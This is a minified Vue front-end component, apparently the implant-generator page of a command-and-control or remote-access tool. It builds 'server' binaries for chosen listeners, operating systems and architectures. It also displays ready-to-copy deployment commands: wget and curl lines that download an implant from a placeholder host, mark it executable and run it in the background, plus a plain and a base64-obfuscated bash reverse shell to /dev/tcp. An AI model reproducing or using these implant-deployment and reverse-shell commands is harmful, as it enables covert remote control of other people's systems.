import{_ as A}from"./e1619f58.js";/* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        */import{C}from"./e021e21f.js";import{a as i,w as G,x as F,y as I,z as D,o as N,A as P,v as T,B as z,C as Y}from"./431e6e02.js";import{H,r as J,_ as b,l as s,m as u,V as a,P as t,p as w,F as x,a8 as h,T as E,O as v,U as k}from"./95bbca75.js";const Z={class:"form-container"},$={class:"command-prompt"},q=H({__name:"ServerGen",setup(K){const y=J([]),S=async()=>{const n=await C.ShowListener();n.status===200?n.data.status===200?y.value=n.data.data:i.error(n.data.data):i.error("Something wrong")},U=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],L={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},l=b({listener:"",os:"",arch:"",pass:""}),p=b([]),B=n=>{l.arch="",p.splice(0,p.length,...L[n]||[])},M=async()=>{let n="";try{const o=await C.GenServer({osType:l.os,archType:l.arch,listener:l.listener,pass:l.pass});if(o.status==200){i.success("导出成功");const c=o.headers["content-disposition"]||"",r=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(c);let m=r&&r.length>1?decodeURIComponent(r[1].replace(/['"]/g,"")):"exported_file",f=new Blob([o.data],{type:o.headers["content-type"]}),d=document.createElement("a"),_=window.URL.createObjectURL(f);d.href=_,d.download=m,document.body.appendChild(d),d.click(),document.body.removeChild(d),window.URL.revokeObjectURL(_)}else i.error("导出失败，请稍后重试")}catch{i.error(`执行命令失败，请检查后端日志 ${n}`)}},O=b([{name:"上线命令",code:"./r_linux_amd64 [上线密码]"},{name:"linux wget上线",code:"wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &"},{name:"linux curl上线",code:"curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &"},{name:"反弹shell",code:"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"},{name:"反弹shell2",code:"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}"}]);return(n,o)=>{const c=T,r=G,m=F,f=I,d=D,_=N,g=P,V=z,R=Y;return s(),u("div",null,[a(g,{class:"box-card"},{default:t(()=>[w("div",Z,[a(d,{model:l,"label-width":"120px"},{default:t(()=>[a(m,{label:"Listener"},{default:t(()=>[a(r,{modelValue:l.listener,"onUpdate:modelValue":o[0]||(o[0]=e=>l.listener=e),placeholder:"选择listener",onVisibleChange:S},{default:t(()=>[(s(!0),u(x,null,h(y.value,e=>(s(),v(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"操作系统"},{default:t(()=>[a(r,{modelValue:l.os,"onUpdate:modelValue":o[1]||(o[1]=e=>l.os=e),placeholder:"选择操作系统",onChange:B},{default:t(()=>[(s(),u(x,null,h(U,e=>a(c,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),a(m,{label:"架构"},{default:t(()=>[a(r,{modelValue:l.arch,"onUpdate:modelValue":o[2]||(o[2]=e=>l.arch=e),placeholder:"选择架构",disabled:p.length===0},{default:t(()=>[(s(!0),u(x,null,h(p,e=>(s(),v(c,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1}),a(m,{label:"上线密码"},{default:t(()=>[a(f,{modelValue:l.pass,"onUpdate:modelValue":o[3]||(o[3]=e=>l.pass=e),style:{width:"220px"},placeholder:"输入上线密码"},null,8,["modelValue"])]),_:1})]),_:1},8,["model"]),a(_,{type:"primary",onClick:M,disabled:!l.os||!l.arch},{default:t(()=>[E(" 生成 ")]),_:1},8,["disabled"])])]),_:1}),w("div",$,[(s(!0),u(x,null,h(O,(e,j)=>(s(),v(g,{shadow:"hover",key:j,class:"command-item"},{default:t(()=>[a(R,null,{default:t(()=>[a(V,{span:4,class:"command-name"},{default:t(()=>[E(k(e.name),1)]),_:2},1024),a(V,{span:20,class:"command-code"},{default:t(()=>[w("code",null,k(e.code),1)]),_:2},1024)]),_:2},1024)]),_:2},1024))),128))])])}}});const re=A(q,[["__scopeId","data-v-1433a8c9"]]);export{re as default};
